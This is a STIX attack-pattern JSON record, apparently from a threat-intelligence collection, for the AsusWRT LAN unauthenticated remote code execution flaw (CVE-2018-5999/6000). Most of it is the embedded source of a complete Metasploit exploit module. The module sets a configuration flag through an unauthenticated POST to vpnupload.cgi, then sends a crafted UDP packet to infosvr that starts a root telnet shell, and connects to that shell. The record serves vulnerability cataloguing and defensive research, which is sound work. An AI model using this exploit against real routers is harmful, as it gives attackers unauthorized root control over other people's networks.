{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f1e7b2fa-1dc7-4a21-bad4-d8cb3b8ac784",
    "created": "2024-08-14T17:02:58.795027Z",
    "modified": "2024-08-14T17:02:58.795031Z",
    "name": "AsusWRT LAN Unauthenticated Remote Code Execution",
    "description": " The HTTP server in AsusWRT has a flaw where it allows an unauthenticated client to perform a POST in certain cases. This can be combined with another vulnerability in the VPN configuration upload routine that sets NVRAM configuration variables directly from the POST request to enable a special command mode. This command mode can then be abused by sending a UDP packet to infosvr, which is running on port UDP 9999 to directly execute commands as root. This exploit leverages that to start telnetd in a random port, and then connects to it. It has been tested with the RT-AC68U running AsusWRT Version 3.0.0.4.380.7743. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/asuswrt_lan_rce.rb",
            "external_id": "asuswrt_lan_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/3589"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/asuswrt-lan-rce.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2018/Jan/78"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-5999"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-6000"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AsusWRT LAN Unauthenticated Remote Code Execution',\n      'Description'    => %q{\n      The HTTP server in AsusWRT has a flaw where it allows an unauthenticated client to\n      perform a POST in certain cases. This can be combined with another vulnerability in\n      the VPN configuration upload routine that sets NVRAM configuration variables directly\n      from the POST request to enable a special command mode.\n      This command mode can then be abused by sending a UDP packet to infosvr, which is running\n      on port UDP 9999 to directly execute commands as root.\n      This exploit leverages that to start telnetd in a random port, and then connects to it.\n      It has been tested with the RT-AC68U running AsusWRT Version 3.0.0.4.380.7743.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'https://blogs.securiteam.com/index.php/archives/3589'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/asuswrt-lan-rce.txt'],\n          ['URL', 'https://seclists.org/fulldisclosure/2018/Jan/78'],\n          ['CVE', '2018-5999'],\n          ['CVE', '2018-6000']\n        ],\n      'Targets'        =>\n        [\n          [ 'AsusWRT < v3.0.0.4.384.10007',\n            {\n              'Payload'        =>\n                {\n                  'Compat'  => {\n                    'PayloadType'    => 'cmd_interact',\n                    'ConnectionType' => 'find',\n                  },\n                },\n            }\n          ],\n        ],\n      'Privileged'     => true,\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n      'DisclosureDate'  => '2018-01-22',\n      'DefaultTarget'   => 0))\n    register_options(\n      [\n        Opt::RPORT(9999)\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new('ASUSWRTPORT', [true,  'AsusWRT HTTP portal port', 80])\n      ])\n  end\n\n  def exploit\n    # first we set the ateCommand_flag variable to 1 to allow PKT_SYSCMD\n    # this attack can also be used to overwrite the web interface password and achieve RCE by enabling SSH and rebooting!\n    post_data = Rex::MIME::Message.new\n    post_data.add_part('1', content_type = nil, transfer_encoding = nil, content_disposition = \"form-data; name=\\\"ateCommand_flag\\\"\")\n\n    data = post_data.to_s\n\n    res = send_request_cgi({\n      'uri'    => \"/vpnupload.cgi\",\n      'method' => 'POST',\n      'rport'  => datastore['ASUSWRTPORT'],\n      'data'   => data,\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    if res and res.code == 200\n      print_good(\"#{peer} - Successfully set the ateCommand_flag variable.\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to set ateCommand_flag variable.\")\n    end\n\n\n    # ... but we like to do it more cleanly, so let's send the PKT_SYSCMD as described in the comments above.\n    info_pdu_size = 512                         # expected packet size, not sure what the extra bytes are\n    r = Random.new\n\n    ibox_comm_pkt_hdr_ex  =\n        [0x0c].pack('C*') +                     # NET_SERVICE_ID_IBOX_INFO  0xC\n        [0x15].pack('C*') +                     # NET_PACKET_TYPE_CMD 0x15\n        [0x33,0x00].pack('C*') +                # NET_CMD_ID_MANU_CMD 0x33\n        r.bytes(4) +                            # Info, don't know what this is\n        r.bytes(6) +                            # MAC address\n        r.bytes(32)                             # Password\n\n    telnet_port = rand((2**16)-1024)+1024\n    cmd = \"/usr/sbin/telnetd -l /bin/sh -p #{telnet_port}\" + [0x00].pack('C*')\n    pkt_syscmd =\n        [cmd.length,0x00].pack('C*') +          # cmd length\n        cmd                                     # our command\n\n    pkt_final = ibox_comm_pkt_hdr_ex + pkt_syscmd + r.bytes(info_pdu_size - (ibox_comm_pkt_hdr_ex + pkt_syscmd).length)\n\n    connect_udp\n    udp_sock.put(pkt_final)                     # we could process the response, but we don't care\n    disconnect_udp\n\n    print_status(\"#{peer} - Packet sent, let's sleep 10 seconds and try to connect to the router on port #{telnet_port}\")\n    sleep(10)\n\n    begin\n      ctx = { 'Msf' => framework, 'MsfExploit' => self }\n      sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnet_port, 'Context' => ctx, 'Timeout' => 10 })\n      if not sock.nil?\n        print_good(\"#{peer} - Success, shell incoming!\")\n        return handler(sock)\n      end\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n      sock.close if sock\n    end\n\n    print_bad(\"#{peer} - Well that didn't work... try again?\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-01-22",
    "x_mitre_platforms": [
        "unix'"
    ]
}